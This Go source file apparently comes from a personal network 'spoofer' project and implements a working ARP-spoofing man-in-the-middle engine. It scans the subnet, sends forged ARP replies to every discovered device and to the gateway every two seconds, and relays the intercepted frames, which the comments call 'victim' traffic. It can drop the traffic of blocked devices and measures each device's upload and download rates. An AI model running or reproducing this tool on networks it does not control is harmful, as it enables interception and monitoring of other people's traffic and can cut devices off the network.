package engine

import (
	"bufio"
	"context"
	"fmt"
	"log"
	"net"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"crypto/sha256"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"
	"github.com/gopacket/gopacket/pcap"

	"github.com/miekg/dns"
)

const maxFrame = 1500 + 14

type nameCh struct {
	name string
	ip   string
	mac  string
}

// TODO:
// 1. gracefull shutdowns
// 2. make logs
// 3. persistant data
// 4. windows port

type DeviceMap struct {
	Devices map[string]*Device
	mu      *sync.RWMutex
}

// type BlockedDevices struct {
// 	ds map[string]bool
// 	mu *sync.RWMutex
// }

// look into this
func (d *Device) tick() {
	now := time.Now()
	if d.lastMeasure.IsZero() {
		d.prevBytesSent = d.BytesSent
		d.prevBytesRecv = d.BytesReceived
		d.lastMeasure = now
		return
	}
	elapsed := now.Sub(d.lastMeasure).Seconds()
	if elapsed < 0.001 {
		return
	}
	d.UpRate = float64(d.BytesSent-d.prevBytesSent) / elapsed
	d.DownRate = float64(d.BytesReceived-d.prevBytesRecv) / elapsed
	d.prevBytesSent = d.BytesSent
	d.prevBytesRecv = d.BytesReceived
	d.lastMeasure = now
}

func (d Device) String() string {
	return fmt.Sprintf("Name: %s, IP: %s, MAC: %s, Interface: %s, Reachable: %t, Mask: %s, UpRate: %.2f, DownRate: %.2f", d.Name,
		d.IP.String(), net.HardwareAddr(d.MAC).String(), d.Interface, d.Reachable, d.Mask.MaskIP.String(), d.UpRate, d.DownRate)
}

type Engine struct {
	Devices DeviceMap
}

type gateway struct {
	ip  net.IP
	mac net.HardwareAddr
}

var gateWay atomic.Pointer[gateway]

func (e *Engine) DevicesSnapshot() []Device {
	if e.Devices.mu == nil {
		return nil
	}
	e.Devices.mu.RLock()
	defer e.Devices.mu.RUnlock()
	out := make([]Device, 0, len(e.Devices.Devices))
	for _, d := range e.Devices.Devices {
		out = append(out, *d)
	}
	return out
}

func (e *Engine) DeviceByIP(ip string) (*Device, bool) {
	if e.Devices.mu == nil {
		return nil, false
	}
	e.Devices.mu.RLock()
	defer e.Devices.mu.RUnlock()
	for _, d := range e.Devices.Devices {
		if d.IP.String() == ip {
			return d, true
		}
	}
	return nil, false
}

func BlockDevice(d *Device) {
	d.Blocked = true
}

func UnblockDevice(d *Device) {
	d.Blocked = false
}

func blockForwardingForDev(ifaces []string) {
	SetNetworkForwardState(ifaces, FORWARD_DROP)
	state := GetNetworkForwardState(ifaces)
	if state != FORWARD_DROP {
		// panic("forwarding state is not drop: " + state)
		log.Println("forwarding state is not drop")
	}
}

// 1. setup rcv loop //listens for replys from the send loop but we set it up first so we don't miss any replys // device chanel
// 2. setup send loop // send arp requests to all available ips on the network
// 3. setup poison loop // send forged replys to spoof
// 4. setup measure loop // measure rate up and down
func Start(e *Engine) {
	host := getHost()
	fmt.Printf("host %s", host.String())
	ds := DeviceMap{
		Devices: make(map[string]*Device),
		mu:      &sync.RWMutex{},
	}
	e.Devices = ds
	handle, err := pcap.OpenLive(host.Interface, 1600, true, 1000*time.Millisecond)
	if err != nil {
		panic("Error opening device: " + err.Error())
	}
	if host.Reachable == false {
		panic("No active interface found")
	}
	defer handle.Close()

	ifaces := []string{host.Interface, host.ifaceName}
	blockForwardingForDev(ifaces)

	// state := GetNetworkForwardState(ifaces)
	// log.Println("state", state)
	// if state != FORWARD_ACCEPT {
	// 	err := SetNetworkForwardState(ifaces, FORWARD_ACCEPT)
	// 	if err != nil {
	// 		panic(err)
	// 	}
	// 	if GetNetworkForwardState(ifaces) != FORWARD_ACCEPT {
	// 		panic(fmt.Errorf("couldn't enable forwarding state :(%s) for dev (%s)", state, host.Interface))
	// 	}
	// }

	// TeardownLimiter(host.Interface)
	// err = InitLimiter(host.Interface)
	// if err != nil {
	// 	panic(err)
	// }

	errChan := make(chan error)
	deviceCh := make(chan *Device)
	nameChan := make(chan nameCh)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	go ArpRCV(deviceCh, host, handle, ctx, errChan)
	go ArpSendRequests(host, handle, ctx, errChan)
	go ArpSendForgedReplys(ds, host, handle, ctx, errChan)
	go IpTrafficMonitor(ds, host, ctx, errChan)
	go Relay(ds, host, ctx, errChan)

	for {
		select {
		case <-ctx.Done():
			TeardownLimiter(host.Interface)
			return
		case err := <-errChan:
			log.Println("Error:", err)
		case name := <-nameChan:
			ds.mu.Lock()
			hash := createDeviceHash(name.ip, name.mac)
			dv, ok := ds.Devices[hash]
			if !ok {
				log.Println("device not found")
				continue
			}
			dv.Name = name.name
			ds.mu.Unlock()
		case device := <-deviceCh:
			ds.mu.Lock()
			ip := device.IP.String()
			mac := net.HardwareAddr(device.MAC).String()
			hash := createDeviceHash(ip, mac)
			if _, ok := ds.Devices[hash]; !ok {
				ds.Devices[hash] = device
				go getDeviceName(nameChan, ip, mac)
			}
			ds.mu.Unlock()
		}
	}
}

func Relay(devices DeviceMap, host Device, ctx context.Context, errChan chan error) {
	// Own handle: a pcap handle may only be read by one goroutine, and ArpRCV
	// already owns the one opened in Start.
	inactive, err := pcap.NewInactiveHandle(host.Interface)
	if err != nil {
		return
	}
	defer inactive.CleanUp()

	if err := inactive.SetSnapLen(65536); err != nil {
		return
	}
	if err := inactive.SetPromisc(true); err != nil {
		return
	}
	if err := inactive.SetImmediateMode(true); err != nil {
		return
	}

	handle, err := inactive.Activate()
	if err != nil {
		errChan <- err
		log.Println("relay: open failed:", err)
		return
	}
	defer handle.Close()

	hostMAC := net.HardwareAddr(host.MAC)
	hostIP := host.IP

	// Only frames addressed to us can be transit. This one clause also drops
	// broadcast, multicast, and our own injected frames.
	filter := "ether dst " + hostMAC.String() + " and ip"
	if err := handle.SetBPFFilter(filter); err != nil {
		errChan <- err
		log.Println("relay: bpf failed:", err)
		return
	}

	packetsCh := gopacket.NewPacketSource(handle, handle.LinkType()).PacketsCtx(ctx)

	for packet := range packetsCh {
		if ctx.Err() != nil {
			return
		}

		data := packet.Data()
		if len(data) < 34 { // 14 Ethernet + 20 minimal IPv4
			continue
		}
		if net.HardwareAddr(data[6:12]).String() == hostMAC.String() {
			continue // our own injection, reflected back
		}
		capture := packet.Metadata().CaptureInfo
		if capture.CaptureLength < capture.Length {
			continue
		}
		if len(packet.Data()) > 1514 {
			continue
		}
		ipLayer := packet.Layer(layers.LayerTypeIPv4)
		if ipLayer == nil {
			continue
		}
		ip4 := ipLayer.(*layers.IPv4)
		src, dst := ip4.SrcIP, ip4.DstIP

		if src.Equal(hostIP) || dst.Equal(hostIP) {
			continue // our own traffic
		}

		nextHop, ok := relayNextHop(devices, src, dst)
		if !ok || nextHop == nil || nextHop.String() == hostMAC.String() {
			continue
		}

		copy(data[0:6], nextHop)  // Ethernet dst -> the real next hop
		copy(data[6:12], hostMAC) // Ethernet src -> us
		err := handle.WritePacketData(data)
		if err != nil {
			log.Println("relay: inject failed:", err)
		}
	}
}

// relayNextHop decides where a transit frame is really headed and returns the
// MAC of the next hop, or ok=false when the frame is not ours to move.
func relayNextHop(devices DeviceMap, src, dst net.IP) (net.HardwareAddr, bool) {
	devices.mu.RLock()
	var srcDev, dstDev *Device
	for _, d := range devices.Devices {
		if d.IP.Equal(dst) {
			dstDev = d
		}
		if d.IP.Equal(src) {
			srcDev = d
		}
	}
	devices.mu.RUnlock()

	// internet/LAN -> victim: deliver straight to the victim.
	if dstDev != nil {
		if dstDev.Blocked {
			return nil, false
		}
		return net.HardwareAddr(dstDev.MAC), true
	}

	// victim -> internet: hand it back to the real gateway.
	if srcDev != nil {
		if srcDev.Blocked {
			return nil, false
		}
		gw := gateWay.Load()
		if gw == nil {
			return nil, false
		}
		return gw.mac, true
	}

	return nil, false
}

func maxSubnet(host Device) []byte {
	invertedMask := make(net.IPMask, len(host.Mask.Mask))
	copy(invertedMask, host.Mask.Mask)
	invertedMask[0] = ^invertedMask[0]
	invertedMask[1] = ^invertedMask[1]
	invertedMask[2] = ^invertedMask[2]
	invertedMask[3] = ^invertedMask[3]
	maxSub := make([]byte, len(invertedMask))

	for i := range invertedMask {
		maxSub[i] = invertedMask[i] | host.IP[i]
	}
	return maxSub
}

func ArpSendRequests(host Device, handle *pcap.Handle, ctx context.Context, errChan chan error) {
	ip := host.IP.Mask(host.Mask.Mask).To4()
	maxSub := maxSubnet(host)

	fmt.Printf("Max Subnet: %s\n", net.IP(maxSub).String())
	fmt.Printf("IP: %s\n", ip.String())
	fmt.Println("interfa", host.Interface)
	// send arp packets per ip in subnet
	//
	// TODO: should be done ina goroutine with a 5s ticker
	tk := time.NewTicker(time.Second * 5)
	for {
		select {
		case <-ctx.Done():
			return
		case <-tk.C:
			for {
				if ip.Equal(net.IP(maxSub)) {
					break
				}

				if ip.Equal(host.IP) {
					incrementIP(ip)
					continue
				}

				err := arpSendOperation(
					net.HardwareAddr(host.MAC),
					net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
					host.MAC,
					net.HardwareAddr{0, 0, 0, 0, 0, 0},
					host.IP,
					ip,
					layers.ARPRequest,
					handle,
				)
				// TODO: buld a log
				if err != nil {
					log.Println("Error sending packet:", err)
				}

				incrementIP(ip)
			}
		}
	}
}

func IpTrafficMonitor(devices DeviceMap, host Device, ctx context.Context, errChan chan error) {
	// Own handle: a pcap handle may only be read by one goroutine, and ArpRCV
	// already owns the one opened in Start.
	inactive, err := pcap.NewInactiveHandle(host.Interface)
	if err != nil {
		return
	}
	defer inactive.CleanUp()

	if err := inactive.SetSnapLen(65536); err != nil {
		return
	}
	if err := inactive.SetPromisc(true); err != nil {
		return
	}
	if err := inactive.SetImmediateMode(true); err != nil {
		return
	}

	handle, err := inactive.Activate()
	if err != nil {
		errChan <- err
		log.Println("relay: open failed:", err)
		return
	}
	defer handle.Close()
	err = handle.SetBPFFilter("ether dst " + net.HardwareAddr(host.MAC).String() + " and ip")
	if err != nil {
		errChan <- err
		log.Println("Error setting filter for ip:", err)
	}
	packetSource := gopacket.NewPacketSource(
		handle,
		handle.LinkType(),
	)

	packetsCh := packetSource.PacketsCtx(ctx)
	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			devices.mu.Lock()
			for _, d := range devices.Devices {
				d.tick()
			}
			devices.mu.Unlock()
		case packet, ok := <-packetsCh:
			if !ok {
				return
			}
			ipLayer := packet.Layer(layers.LayerTypeIPv4)
			if ipLayer == nil {
				continue
			}

			ip := ipLayer.(*layers.IPv4)
			src := ip.SrcIP
			dst := ip.DstIP
			bytes := int64(ip.Length)
			devices.mu.Lock()
			for _, d := range devices.Devices {
				if d.IP.Equal(src) {
					d.BytesSent += bytes
				}
				if d.IP.Equal(dst) {
					d.BytesReceived += bytes
				}
			}
			devices.mu.Unlock()
		}
	}
}

func ArpSendForgedReplys(devices DeviceMap, host Device, handle *pcap.Handle, ctx context.Context, errChan chan error) {
	ticker := time.NewTicker(time.Second * 2)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			gw := gateWay.Load()
			if gw == nil {
				continue
			}
			// the two loops above
			devices.mu.RLock()
			for _, device := range devices.Devices {
				if device.IP.Equal(host.IP) || device.IP.Equal(gw.ip) {
					continue
				}
				err := arpSendOperation(
					net.HardwareAddr(host.MAC),
					net.HardwareAddr(device.MAC),
					host.MAC,
					device.MAC,
					gw.ip,
					device.IP,
					layers.ARPReply,
					handle,
				)
				if err != nil {
					errChan <- err
					log.Println("Error sending reply:", err)
				}

				err = arpSendOperation(
					net.HardwareAddr(host.MAC),
					gw.mac,
					host.MAC,
					gw.mac,
					device.IP,
					gw.ip,
					layers.ARPReply,
					handle,
				)

				if err != nil {
					errChan <- err
					log.Println("Error sending reply to gate way:", err)
				}
			}
			devices.mu.RUnlock()
		}
	}

}

// rcv goroutine
func ArpRCV(deviceCh chan *Device, host Device, handle *pcap.Handle, ctx context.Context, errChan chan error) {
	packetSource := gopacket.NewPacketSource(
		handle,
		handle.LinkType(),
	)
	packetsCh := packetSource.PacketsCtx(ctx)

	for {
		for packet := range packetsCh {
			arpLayer := packet.Layer(layers.LayerTypeARP)
			// TODO: skip packets sent by us
			//
			if arpLayer == nil {
				continue
			}
			arp := arpLayer.(*layers.ARP)

			srcMAC := net.HardwareAddr(arp.SourceHwAddress)
			if len(arp.SourceProtAddress) != net.IPv4len {
				continue
			}
			srcIP := net.IP(arp.SourceProtAddress)
			if srcIP.Equal(net.IPv4zero) {
				continue
			} // DAD probes
			if srcMAC.String() == "00:00:00:00:00:00" {
				continue
			} // probes / unanswered
			if srcMAC.String() == net.HardwareAddr(host.MAC).String() {
				continue
			} // ours
			if srcIP.Equal(host.IP) {
				continue
			}
			if gateWay.Load() == nil && srcIP.Equal(net.ParseIP("192.168.1.1")) {
				gateWay.Store(&gateway{ip: srcIP, mac: srcMAC})
				fmt.Println("found gateway" + fmt.Sprintf("%s %s", srcIP.String(), srcMAC.String()))
			}
			device := &Device{
				IP:        net.IP(arp.SourceProtAddress),
				MAC:       net.HardwareAddr(arp.SourceHwAddress),
				Reachable: true,
				Mask: Mask{
					MaskIP: host.Mask.MaskIP,
					Mask:   host.Mask.Mask,
				},
			}

			deviceCh <- device
			// TODO: remove this
			fmt.Printf(
				"ARP: %s (%s) -> %s (%s), op=%d\n",
				device.IP.String(),
				net.HardwareAddr(device.MAC).String(),
				net.IP(arp.DstProtAddress).String(),
				net.HardwareAddr(arp.DstHwAddress).String(),
				arp.Operation,
			)
		}
		select {
		case <-ctx.Done():
			return
		}
	}
}

func getVendor(mac string) string {
	prefix := strings.ToUpper(strings.ReplaceAll(mac, ":", ""))[:6]

	f, err := os.Open("/home/saif/Dev/personal-projects/GolangPrrrr/spoofer/data/ieee-oui.txt") // FIX: don't hard code this
	if err != nil {
		return "Unknown"
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)

	for scanner.Scan() {
		line := scanner.Text()

		if strings.HasPrefix(strings.ToUpper(line), prefix) {
			parts := strings.Fields(line)

			if len(parts) >= 2 {
				return strings.Join(parts[1:], " ")
			}
		}
	}

	return ""
}

// TODO: start a goroutine to resolve the name with lookup addr, mdns, llmnr ..etc, and listen for changes later
func getDeviceName(nameChane chan nameCh, ip string, mac string) {
	var name string
	names, err := net.LookupAddr(ip)
	if err == nil && len(names) > 0 {
		name = strings.TrimSuffix(names[0], ".")
	}
	name = getVendor(mac)
	if name == "" {
		name = "Unknown"

	}
	nameChane <- nameCh{name: name, ip: ip, mac: mac}
	// if name, err := reverseMDN(ip); err == nil {
	// 	d.Name = name
	// 	return
	// }
}

func reverseMDNS(ip string) (string, error) {
	addr := net.ParseIP(ip).To4()
	if addr == nil {
		return "", fmt.Errorf("invalid IPv4: %s", ip)
	}
	q := fmt.Sprintf("%d.%d.%d.%d.in-addr.arpa.", addr[3], addr[2], addr[1], addr[0])

	msg := new(dns.Msg)
	msg.SetQuestion(q, dns.TypePTR)
	msg.RecursionDesired = false
	b, err := msg.Pack()
	if err != nil {
		return "", err
	}

	pc, err := net.ListenPacket("udp4", ":0") // unconnected, non-5353 port
	if err != nil {
		return "", err
	}
	defer pc.Close()

	for _, dst := range []string{ip + ":5353", "224.0.0.251:5353"} {
		if ua, err := net.ResolveUDPAddr("udp4", dst); err == nil {
			pc.WriteTo(b, ua)
		}
	}

	pc.SetReadDeadline(time.Now().Add(2 * time.Second))
	buf := make([]byte, 1500)
	for {
		n, _, err := pc.ReadFrom(buf)
		if err != nil {
			return "", err
		}
		var resp dns.Msg
		if resp.Unpack(buf[:n]) != nil {
			continue
		}
		for _, rr := range resp.Answer {
			if ptr, ok := rr.(*dns.PTR); ok && strings.EqualFold(ptr.Hdr.Name, q) {
				return strings.TrimSuffix(ptr.Ptr, "."), nil
			}
		}
	}
}

func createDeviceHash(ip string, mac string) string {
	hash := sha256.New()
	_, err := hash.Write([]byte(ip))
	if err != nil {
		fmt.Println("Error creating hash:", err)
		return ""
	}
	_, err = hash.Write([]byte(mac))
	if err != nil {
		fmt.Println("Error creating hash:", err)
		return ""
	}
	return fmt.Sprintf("%x", hash.Sum(nil))
}

func incrementIP(ip net.IP) {
	for i := len(ip) - 1; i >= 0; i-- {
		ip[i]++
		if ip[i] > 0 {
			break
		}
	}
}

// A warapper used to build arp packets for both req and reply
// see https://github.com/google/gopacket/blob/master/layers/arp.go
func arpSendOperation(srcMac, dstMac, srcHwAddr, dstHwAddr net.HardwareAddr,
	srcIp, dstIp net.IP,
	arpOpType uint16,
	handle *pcap.Handle) error {
	ethLayer := &layers.Ethernet{
		SrcMAC:       srcMac,
		DstMAC:       dstMac,
		EthernetType: layers.EthernetTypeARP,
	}

	arpLayer := &layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         arpOpType,
		SourceHwAddress:   srcHwAddr,
		SourceProtAddress: srcIp.To4(),
		DstHwAddress:      dstHwAddr,
		DstProtAddress:    dstIp.To4(),
	}

	var err error
	buffer := gopacket.NewSerializeBuffer()
	options := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
	err = gopacket.SerializeLayers(buffer, options, ethLayer, arpLayer)
	if err != nil {
		return err
	}
	outboundPacket := buffer.Bytes()
	err = handle.WritePacketData(outboundPacket)
	if err != nil {
		return err
	}
	return err
}

// TODO : find a better way to combine both of the ways we get the info here
func getHost() Device {
	host := Device{}
	fmt.Println(host.String())
	hostname, _ := os.Hostname()
	host.Name = hostname

	// Dial a UDP address to find the active outbound IP.
	// This does not actually send any network packets or require an internet connection.
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		fmt.Println("Error identifying active interface:", err)
		return host
	}
	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)
	activeIP := localAddr.IP

	interfaces, err := net.Interfaces()
	if err != nil {
		fmt.Println("Error reading interfaces:", err)
		return host
	}

	for _, iface := range interfaces {
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}

		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP.To4()
			case *net.IPAddr:
				ip = v.IP.To4()
			}

			if ip != nil && ip.Equal(activeIP) {
				host.Interface = iface.Name
				host.ifaceName = iface.Name
				host.Reachable = true
				host.IP = ip.To4()
				if iface.HardwareAddr.String() != "" {
					host.MAC = iface.HardwareAddr
				}
			}
		}
	}

	stringIface := func(iface pcap.Interface) string {
		var b strings.Builder

		fmt.Fprintf(&b, "Name: %s, Description: %s", iface.Name, iface.Description)

		for _, addr := range iface.Addresses {
			fmt.Fprintf(&b, "\n  IP: %s, Netmask: %s", addr.IP, addr.Netmask)
		}

		return b.String()
	}
	// NOTE : will this work on linux and windows?
	ifs, _ := pcap.FindAllDevs()
	for _, iface := range ifs {
		log.Println("ifs", stringIface(iface))
		for _, addr := range iface.Addresses {
			if addr.IP.Equal(host.IP) {
				host.Interface = iface.Name
				host.Mask.MaskIP = net.IP(addr.Netmask)
				host.Mask.Mask = addr.Netmask
			}
		}
	}

	return host
}
